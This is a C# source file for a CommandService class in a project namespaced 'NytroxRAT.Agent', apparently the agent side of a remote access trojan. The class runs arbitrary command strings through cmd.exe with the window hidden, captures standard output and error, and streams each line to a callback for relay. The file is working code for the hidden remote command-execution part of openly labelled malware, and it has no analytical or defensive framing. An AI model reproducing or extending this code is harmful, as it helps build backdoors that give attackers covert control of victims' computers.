using System.Diagnostics;

namespace NytroxRAT.Agent.Services;

public class CommandService
{
    /// <summary>
    /// Runs a command via cmd.exe and streams output lines via the callback.
    /// The callback receives (line, isError, isFinished).
    /// </summary>
    public async Task ExecuteAsync(string command,
        Func<string, bool, bool, Task> outputCallback,
        CancellationToken ct = default)
    {
        var psi = new ProcessStartInfo
        {
            FileName               = "cmd.exe",
            Arguments              = $"/C {command}",
            RedirectStandardOutput = true,
            RedirectStandardError  = true,
            UseShellExecute        = false,
            CreateNoWindow         = true
        };

        using var process = new Process { StartInfo = psi };
        process.OutputDataReceived += (_, e) =>
        {
            if (e.Data == null) return;
            outputCallback(e.Data, false, false).GetAwaiter().GetResult();
        };
        process.ErrorDataReceived += (_, e) =>
        {
            if (e.Data == null) return;
            outputCallback(e.Data, true, false).GetAwaiter().GetResult();
        };

        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();

        await process.WaitForExitAsync(ct);
        await outputCallback("", false, true);
    }
}
